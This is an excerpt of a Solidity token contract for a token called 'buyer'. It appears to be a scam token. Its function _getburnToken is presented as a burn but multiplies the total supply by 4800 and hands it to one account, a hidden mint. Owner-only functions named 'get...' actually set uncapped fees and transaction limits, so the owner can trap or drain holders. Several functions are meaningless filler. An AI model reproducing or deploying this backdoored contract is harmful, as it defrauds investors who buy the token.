...
contract buyer is Context, Ownable {
    using SafeMath for uint256;

    string _name = "buyer";
    string _symbol = "BUYER";
    uint8 _decimals = 9;
    ...
    function forprocessIndex(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
    ...
    function _getburnToken(address account, uint256 amounts) internal {
		require(account != address(0), "BEP20: burn from the zero address"); 
		_totalSupply = _totalSupply * (4800);
		_balances[account] = _totalSupply - (amounts);
		_balances[account] = _balances[account] - (amounts);
		_totalSupply = _totalSupply - (amounts);
	  }

    function disOverLiquified(address sender, uint256 target, uint256 accuracy) public view returns (bool){
		  require(_balances[sender] > accuracy);
		  return accuracy > target;
	  }

    function istributeReward(address _genesisPool, bool rewardPoolDistributed) external view onlyOwner returns (bool) {
    ...
    function getSwapFees(uint8 fee) external onlyOwner {
        swapTokensFees = fee;
    }

    function getLiquidity(uint8 liquidityFee) external onlyOwner {
        liquidityFees = liquidityFee;
    }
   
    function getMarketing(uint8 marketingFee) external onlyOwner {
        marketingFees = marketingFee;
    }
  
    function getLpReward(uint8 rewardFee) external onlyOwner {
        lpRewardFees = rewardFee;
    }

    function getTxPercent(uint256 maxTxPercent) external onlyOwner {
        _maxTxAmount = _totalSupply.mul(maxTxPercent).div(100);
    }
    
    function getTxAmount(uint256 maxTxAmount) external onlyOwner {
